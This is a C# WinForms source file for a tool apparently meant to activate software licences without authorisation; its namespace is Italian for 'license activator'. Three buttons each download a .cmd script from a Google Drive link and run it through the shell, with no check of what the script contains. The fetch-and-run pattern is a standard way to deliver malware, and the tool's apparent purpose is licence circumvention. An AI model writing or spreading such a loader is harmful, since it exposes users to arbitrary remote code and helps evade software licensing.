using System.Diagnostics;
using System.Net;

namespace ATTIVATORE_LICENZE
{
    public partial class Form1 : Form
    {
        private bool _dragging = false;
        private Point _start_point = new Point(0, 0);
        public Form1()
        {
            InitializeComponent();
        }

        static void DownloadAndExecute(string url)
        {
            try
            {
                try
                {
                    // Remove the downloaded file after execution
                    File.Delete("file.cmd");
                }
                catch (Exception xe)
                {
                    Console.WriteLine(xe);
                }
                // Download the file from the direct link
                WebClient webClient = new();
                string filename = "file.cmd";
                webClient.DownloadFile(url, filename);

                // Execute the downloaded file
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = filename;
                psi.UseShellExecute = true;
                Process.Start(psi).WaitForExit();

                Console.WriteLine("Execution successful");
            }
            catch (Exception ex)
            {
                Console.WriteLine("An error occurred: " + ex.Message);
            }
        }

        private void panel1_MouseMove(object sender, MouseEventArgs e)
        {
            if (_dragging)
            {
                Point p = PointToScreen(e.Location);
                Location = new Point(p.X - this._start_point.X, p.Y - this._start_point.Y);
            }
        }

        private void panel1_MouseDown(object sender, MouseEventArgs e)
        {
            _dragging = true;
            _start_point = new Point(e.X, e.Y);
        }

        private void panel1_MouseUp(object sender, MouseEventArgs e)
        {
            _dragging = false;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void label1_MouseMove(object sender, MouseEventArgs e)
        {
            if (_dragging)
            {
                Point p = PointToScreen(e.Location);
                Location = new Point(p.X - this._start_point.X, p.Y - this._start_point.Y);
            }
        }

        private void label1_MouseMove_1(object sender, MouseEventArgs e)
        {
            if (_dragging)
            {
                Point p = PointToScreen(e.Location);
                Location = new Point(p.X - this._start_point.X, p.Y - this._start_point.Y);
            }
        }

        private void label1_MouseDown(object sender, MouseEventArgs e)
        {
            _dragging = true;
            _start_point = new Point(e.X, e.Y);
        }

        private void label1_MouseUp(object sender, MouseEventArgs e)
        {
            _dragging = false;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            DownloadAndExecute("https://drive.usercontent.google.com/download?id=1S6C877B-Z0W0-87ymL4Fa7dUgBVedQtJ&export=download&authuser=0&confirm=t&uuid=8a7cb07b-a277-43c6-a617-72633f96f0cc&at=APZUnTWAMlAf136gCgEMaubT_L_x%3A1711647065722");
        }

        private void button3_Click(object sender, EventArgs e)
        {
            DownloadAndExecute("https://drive.usercontent.google.com/download?id=1vlqKwNA_xYAgh7_7QNrUD_WtfQ5loUD4&export=download&authuser=0&confirm=t&uuid=bb93b19e-30f4-42f0-a83f-969df966abab&at=APZUnTUYoijwvWDlVxqP_xcRy5-F%3A1711648737720");
        }

        private void button4_Click(object sender, EventArgs e)
        {
            DownloadAndExecute("https://drive.usercontent.google.com/download?id=1lPC9ShSKQfjfhSSaON8U7pokAErgRKS_&export=download&authuser=0&confirm=t&uuid=fe9ef2e4-4e6c-4b20-b84e-4547f1203ccd&at=APZUnTVjrySg57RRYp03a1UM0aJf%3A1711648807519");
        }
    }
}
